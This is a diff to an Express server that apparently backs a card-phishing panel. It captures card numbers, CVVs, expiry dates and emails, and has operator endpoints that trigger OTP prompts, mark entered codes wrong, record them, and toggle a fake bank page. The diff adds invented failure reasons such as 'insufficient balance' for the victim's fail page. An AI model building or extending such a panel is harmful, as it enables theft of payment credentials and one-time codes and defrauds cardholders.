@@ -25,11 +25,11 @@ const paymentLinks = new Map();
 app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
-    
+
     if (!amount || isNaN(amount) || amount <= 0) {
       return res.status(400).json({ status: "error", message: "Invalid amount" });
     }
-    
+
     if (!description?.trim()) {
       return res.status(400).json({ status: "error", message: "Description required" });
     }
@@ -64,13 +64,13 @@ app.get('/api/getPaymentDetails', (req, res) => {
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
     const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
-    
+
     if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
       return res.status(400).json({ status: "error", message: "Missing fields" });
     }
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
-    
+
     const transaction = {
       id: invoiceId,
       cardNumber,
@@ -88,7 +88,7 @@ app.post('/api/sendPaymentDetails', (req, res) => {
       bankpageVisible: false,
       timestamp: new Date().toLocaleString()
     };
-    
+
     transactions.set(invoiceId, transaction);
     io.emit('new_transaction');
     res.json({ status: "success", invoiceId });
@@ -106,7 +106,7 @@ app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-  
+
   txn.otpShown = true;
   txn.status = 'otp_pending';
   txn.otpError = false;
@@ -118,7 +118,7 @@ app.post('/api/wrongOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-  
+
   txn.otpError = true;
   txn.status = 'otp_pending';
   res.json({ status: "success", message: "OTP marked wrong" });
@@ -130,17 +130,17 @@ app.get('/api/checkTransactionStatus', (req, res) => {
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
 
   if (txn.status === 'otp_pending' && txn.otpShown) {
-    return res.json({ 
-      status: "show_otp", 
+    return res.json({
+      status: "show_otp",
       message: "Show OTP form",
-      otpError: txn.otpError 
+      otpError: txn.otpError
     });
   }
 
   if (txn.redirectStatus) {
     const redirectUrls = {
       success: `/success.html?invoiceId=${invoiceId}`,
-      fail: `/fail.html?invoiceId=${invoiceId}`,
+      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
       bankpage: `/bankpage.html?invoiceId=${invoiceId}`
     };
     return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
@@ -153,24 +153,34 @@ app.post('/api/submitOTP', (req, res) => {
   const { invoiceId, otp } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-  
+
   txn.otpEntered = otp;
   txn.status = 'otp_received';
   txn.otpError = false;
   res.json({ status: "success", message: "OTP received" });
 });
 
+// UPDATED: Add failure reason to redirect status
 app.post('/api/updateRedirectStatus', (req, res) => {
-  const { invoiceId, redirectStatus } = req.body;
+  const { invoiceId, redirectStatus, failureReason } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
-  
+
   txn.redirectStatus = redirectStatus;
+  if (failureReason) {
+    txn.failureReason = failureReason;
+  }
+
+  const redirectUrls = {
+    success: `/success.html?invoiceId=${invoiceId}`,
+    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
+  };
+
   res.json({
     status: "success",
     invoiceId,
     redirectStatus,
-    redirectUrl: `/bankpage.html?invoiceId=${invoiceId}`
+    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
   });
 });
 
@@ -178,22 +188,64 @@ app.post('/api/showBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ error: 'Transaction not found' });
-  
+
   txn.redirectStatus = 'bankpage';
   txn.bankpageVisible = true;
   res.json({ status: 'success' });
 });
 
-// server.js - Update the hideBankpage endpoint
 app.post('/api/hideBankpage', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
   if (!txn) return res.status(404).json({ error: 'Transaction not found' });
-  
+
   txn.redirectStatus = null;
   txn.bankpageVisible = false;
-  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Add invoiceId to payload
+  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Include invoiceId in the payload
   res.json({ status: 'success' });
+});
+
+// NEW: Add transaction data endpoints for success and fail pages
+app.get('/api/getTransactionForSuccess', (req, res) => {
+  const { invoiceId } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  res.json({
+    status: "success",
+    data: {
+      amount: txn.amount,
+      invoiceId: txn.id,
+      timestamp: txn.timestamp,
+      email: txn.email
+    }
+  });
+});
+
+app.get('/api/getTransactionForFail', (req, res) => {
+  const { invoiceId, reason } = req.query;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
+
+  // Map reason codes to human-readable messages
+  const reasonMessages = {
+    'insufficient_balance': 'Insufficient balance in your account',
+    'bank_declined': 'Transaction declined by bank',
+    'card_disabled': 'Online payments are disabled on your card',
+    'invalid_card': 'Invalid card number or details',
+    'canceled': 'Transaction canceled by user'
+  };
+
+  res.json({
+    status: "failed",
+    data: {
+      amount: txn.amount,
+      invoiceId: txn.id,
+      timestamp: txn.timestamp,
+      email: txn.email,
+      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
+    }
+  });
 });
 
 io.on('connection', (socket) => {
